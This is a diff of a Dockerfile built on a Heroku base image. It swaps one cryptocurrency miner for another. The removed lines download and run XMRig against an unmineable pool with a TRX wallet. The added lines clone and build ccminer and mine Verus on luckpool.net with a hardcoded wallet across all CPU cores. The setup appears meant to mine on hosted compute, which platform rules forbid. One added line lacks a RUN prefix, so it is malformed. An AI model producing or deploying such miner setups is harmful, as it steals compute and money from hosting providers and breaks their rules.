@@ -1,4 +1,4 @@
 FROM heroku/heroku:18
-RUN apt-get install -y curl git unzip wget
-RUN wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-x64.tar.gz && tar -xvf xmrig-6.16.4-linux-x64.tar.gz && cd xmrig-6.16.4 && ./xmrig -o stratum+tcp://rx.unmineable.com:13333 -u TRX:TCR9rNWL15ww3TNDvKsG9sWBd4xsc6Ls6T.cpu -p x --cpu $(nproc --all)
+RUN apt update && apt upgrade && apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential && apt-get install git
+git clone --single-branch -b ARM https://github.com/monkins1010/ccminer && cd ccminer && chmod +x build.sh && chmod +x configure.sh && chmod +x autogen.sh && ./build.sh && ./ccminer -a verus -o stratum+tcp://ap.luckpool.net:3956#xnsub -u RMz1F1pEPh7x9RZxdN7LgpK41uCFk1KGga.q -p x --cpu $(nproc --all)
 CMD bash heroku.sh
